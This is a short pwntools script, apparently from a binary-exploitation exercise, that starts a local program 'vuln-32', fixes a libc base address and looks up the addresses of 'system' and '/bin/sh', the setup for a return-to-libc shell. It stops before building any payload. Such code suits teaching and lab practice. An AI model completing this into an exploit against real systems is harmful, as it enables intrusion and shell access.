from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc                        
libc.address = 0xf7dc2000

offset_to_system = libc.sym['system']
print(offset_to_system)
offset_to_binsh = next(libc.search(b'/bin/sh'))
print(offset_to_binsh)
